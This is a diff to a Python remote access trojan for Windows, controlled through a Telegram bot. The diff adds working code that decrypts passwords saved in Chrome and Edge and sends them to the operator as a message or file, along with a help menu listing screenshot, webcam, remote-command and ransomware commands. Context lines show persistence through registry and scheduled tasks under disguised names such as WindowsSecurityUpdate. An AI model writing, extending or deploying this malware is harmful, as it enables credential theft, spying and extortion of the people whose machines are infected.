@@ -1,4 +1,4 @@
-# RAT_script.py - Fixed killswitch: only kills processes, does NOT delete Python
+# RAT_script.py - Full working script with password grabber and /help
 # Upload to: https://raw.githubusercontent.com/Hehehasmr/mathpython/refs/heads/main/RAT_script.py
 
 import os
@@ -12,9 +12,13 @@ import ctypes
 import winreg
 import tempfile
 import urllib.request
+import shutil
+import sqlite3
+import base64
 from datetime import datetime
 from PIL import ImageGrab
 import io
+import re
 
 # Try to import optional modules
 try:
@@ -52,7 +56,6 @@ def save_offset(offset):
         pass
 
 def reset_offset():
-    """Reset command state - forces re-read of all commands"""
     try:
         if os.path.exists(STATE_FILE):
             os.remove(STATE_FILE)
@@ -70,7 +73,6 @@ def reset_offset():
     return 0
 
 def clear_all_old_commands():
-    """Clear all old commands - ignore everything before now"""
     try:
         resp = requests.get(f"{BASE_URL}/getUpdates", timeout=10)
         data = resp.json()
@@ -120,6 +122,13 @@ def send_message(text):
     except:
         pass
 
+def send_document(file_path, caption=""):
+    try:
+        files = {"document": open(file_path, 'rb')}
+        requests.post(f"{BASE_URL}/sendDocument", data={"chat_id": CHAT_ID, "caption": caption}, files=files, timeout=30)
+    except:
+        pass
+
 def send_photo(photo_bytes):
     try:
         files = {"photo": photo_bytes}
@@ -133,35 +142,28 @@ def get_ip():
     except:
         return "Unable to fetch IP"
 
-# --- KILLSWITCH (FIXED - Does NOT delete Python or script files) ---
+# --- KILLSWITCH (Does NOT delete Python or script) ---
 def kill_rat_only():
-    """KILLSWITCH - Stops all RAT processes but does NOT delete Python or script files"""
     try:
         try:
             send_message("🛑 KILLSWITCH: Stopping all RAT processes...")
         except:
             pass
         
-        # 1. Kill all Python processes (stops the RAT completely)
         os.system("taskkill /f /im python.exe >nul 2>&1")
         os.system("taskkill /f /im python3.exe >nul 2>&1")
-        
-        # 2. Kill command prompts and consoles
         os.system("taskkill /f /im cmd.exe >nul 2>&1")
         os.system("taskkill /f /im conhost.exe >nul 2>&1")
         os.system("taskkill /f /im powershell.exe >nul 2>&1")
         
-        # 3. Remove registry persistence (stops it from restarting)
         os.system("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSystemHealth /f >nul 2>&1")
         os.system("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSecurityUpdate /f >nul 2>&1")
         os.system("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v WindowsSecurityUpdate /f >nul 2>&1")
         
-        # 4. Delete scheduled tasks
         os.system("schtasks /delete /tn DeleteRAT /f >nul 2>&1")
         os.system("schtasks /delete /tn WindowsSecurityUpdate /f >nul 2>&1")
         os.system("schtasks /delete /tn WindowsSystemHealth /f >nul 2>&1")
         
-        # 5. Delete the offset state file (forces fresh start if script runs again)
         try:
             if os.path.exists(STATE_FILE):
                 os.remove(STATE_FILE)
@@ -173,9 +175,7 @@ def kill_rat_only():
         except:
             pass
         
-        # 6. Exit this script cleanly
         sys.exit(0)
-        
     except:
         sys.exit(0)
 
@@ -306,6 +306,177 @@ def trigger_ransomware():
     except Exception as e:
         send_message(f"Ransomware failed: {str(e)[:100]}")
 
+# --- PASSWORD GRABBER (Chrome & Edge) ---
+def decrypt_chrome_password(encrypted_value, key):
+    """Decrypt Chrome/Edge passwords using Windows DPAPI"""
+    try:
+        import win32crypt
+        from Crypto.Cipher import AES
+        import hashlib
+        
+        # For newer Chrome versions (AES-256-GCM)
+        if len(encrypted_value) > 15:
+            try:
+                # Get the key from the local state
+                nonce = encrypted_value[3:15]
+                ciphertext = encrypted_value[15:-16]
+                tag = encrypted_value[-16:]
+                
+                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+                return decrypted.decode('utf-8')
+            except:
+                pass
+        
+        # Fallback to old method
+        try:
+            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
+        except:
+            return None
+    except:
+        return None
+
+def get_chrome_key():
+    """Get the AES key from Chrome/Edge Local State"""
+    try:
+        local_state_paths = [
+            os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Local State",
+            os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Local State"
+        ]
+        
+        for path in local_state_paths:
+            if os.path.exists(path):
+                with open(path, 'r', encoding='utf-8') as f:
+                    import json
+                    local_state = json.loads(f.read())
+                    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+                    # Remove 'DPAPI' prefix
+                    encrypted_key = encrypted_key[5:]
+                    import win32crypt
+                    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        return None
+    except:
+        return None
+
+def extract_passwords_from_db(db_path, key, browser_name):
+    """Extract passwords from a Chrome/Edge Login Data database"""
+    passwords = []
+    temp_db = tempfile.gettempdir() + "\\temp_login.db"
+    
+    try:
+        # Copy the database to temp (file is locked while browser is open)
+        shutil.copy2(db_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        
+        for row in cursor.fetchall():
+            url = row[0]
+            username = row[1] if row[1] else ""
+            encrypted_password = row[2]
+            
+            if encrypted_password:
+                password = decrypt_chrome_password(encrypted_password, key)
+                if password and password != "":
+                    passwords.append(f"URL: {url}\nUsername: {username}\nPassword: {password}\n{'-'*40}")
+        
+        conn.close()
+        os.remove(temp_db)
+        
+    except Exception as e:
+        pass
+    
+    return passwords
+
+def grab_all_passwords():
+    """Grab all saved passwords from Chrome and Edge"""
+    all_passwords = []
+    
+    try:
+        key = get_chrome_key()
+        if not key:
+            return "Unable to get encryption key. Make sure browser is closed."
+        
+        # Chrome passwords
+        chrome_db = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+        if os.path.exists(chrome_db):
+            passwords = extract_passwords_from_db(chrome_db, key, "Chrome")
+            if passwords:
+                all_passwords.append("=== CHROME PASSWORDS ===\n")
+                all_passwords.extend(passwords)
+        
+        # Edge passwords
+        edge_db = os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
+        if os.path.exists(edge_db):
+            passwords = extract_passwords_from_db(edge_db, key, "Edge")
+            if passwords:
+                all_passwords.append("\n=== EDGE PASSWORDS ===\n")
+                all_passwords.extend(passwords)
+        
+        if not all_passwords:
+            return "No passwords found in Chrome or Edge."
+        
+        return "\n".join(all_passwords)
+        
+    except Exception as e:
+        return f"Error grabbing passwords: {str(e)[:200]}"
+
+def send_passwords():
+    """Send grabbed passwords as a file"""
+    try:
+        send_message("📁 Grabbing saved passwords from Chrome and Edge...")
+        
+        passwords = grab_all_passwords()
+        
+        # Create temp file
+        temp_file = os.path.join(tempfile.gettempdir(), "passwords.txt")
+        with open(temp_file, 'w', encoding='utf-8') as f:
+            f.write(f"Passwords grabbed on: {datetime.now()}\n")
+            f.write("="*50 + "\n\n")
+            f.write(passwords)
+        
+        # Send as document
+        if len(passwords) < 4000:
+            send_message(f"📋 PASSWORDS:\n\n{passwords}")
+        else:
+            send_document(temp_file, "📁 Passwords from Chrome and Edge")
+        
+        # Clean up
+        try:
+            os.remove(temp_file)
+        except:
+            pass
+            
+    except Exception as e:
+        send_message(f"Password grab failed: {str(e)[:100]}")
+
+# --- HELP COMMAND ---
+def send_help():
+    help_text = """🤖 **RAT COMMANDS**
+
+📸 **/screenshot** - Capture screen
+💬 **/message <text>** - Fullscreen flashing popup (7 sec)
+🌐 **/ip** - Get public IP
+⚡ **/command <cmd>** - Run system command
+📷 **/webcam** - Capture webcam photo
+🔑 **/passwords** - Grab Chrome/Edge saved passwords
+💀 **/ransomware** - Deploy ransomware
+🧹 **/clear** - Ignore old commands
+🔄 **/reset** - Reset command offset
+🛑 **/killswitch** - Stop RAT (safe, doesn't delete Python)
+❓ **/help** - Show this menu
+
+**Examples:**
+`/message Hello World`
+`/command whoami`
+`/command dir C:\\`
+
+**Note:** /killswitch stops the RAT but keeps Python and script file intact.
+"""
+    send_message(help_text)
+
 # --- Heartbeat ---
 def heartbeat_monitor():
     heartbeat_file = os.path.join(tempfile.gettempdir(), ".sys_heartbeat.tmp")
@@ -330,9 +501,19 @@ def handle_updates(offset):
                     text = msg["text"].strip()
                     lower = text.lower()
                     
-                    # --- KILLSWITCH (FIXED - does NOT delete Python) ---
+                    # --- KILLSWITCH ---
                     if lower == "/killswitch" or lower == "/selfdestruct" or lower == "/emergencystop":
                         threading.Thread(target=kill_rat_only).start()
+                        return new_offset
+                    
+                    # --- HELP ---
+                    if lower == "/help" or lower == "/start":
+                        threading.Thread(target=send_help).start()
+                        return new_offset
+                    
+                    # --- PASSWORDS ---
+                    if lower == "/passwords" or lower == "/grabpasswords" or lower == "/password":
+                        threading.Thread(target=send_passwords).start()
                         return new_offset
                     
                     # --- CLEAR ---
@@ -385,7 +566,6 @@ def handle_updates(offset):
 
 # --- Main Loop ---
 def main_loop():
-    # Clear old commands on startup (prevents replay)
     clear_all_old_commands()
     
     ip = get_ip()
